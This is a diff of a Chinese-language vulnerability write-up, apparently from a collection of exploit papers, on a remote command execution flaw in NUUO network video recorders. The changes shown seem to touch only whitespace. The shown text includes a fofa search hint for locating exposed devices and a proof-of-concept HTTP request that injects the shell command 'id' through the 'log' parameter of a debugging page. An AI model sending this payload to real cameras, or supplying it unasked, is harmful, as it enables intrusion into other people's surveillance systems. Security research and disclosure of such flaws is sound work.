@@ -3,7 +3,7 @@ fofa: "查询语句"
 source: "MrWQ/vulnerability-paper"
 ---
 
-# ​NUUO 摄像头存在远程命令执行漏洞 附 POC
+# NUUO 摄像头存在远程命令执行漏洞 附 POC
 
 <meta name="referrer" content="no-referrer"/>
 > 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/KUCib5T1dkfRPjGztMB3vA)
@@ -48,11 +48,11 @@ title="Network Video Recorder Login"
 漏洞数据包：
 
 ```
-GET /__debugging_center_utils___.php?log=;id HTTP/1.1
-Host: 127.0.0.1
-User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)
-Accept: */*
-Connection: Keep-Alive
+GET /__debugging_center_utils___.php?log=;id HTTP/1.1
+Host: 127.0.0.1
+User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)
+Accept: */*
+Connection: Keep-Alive
 
 ```
 
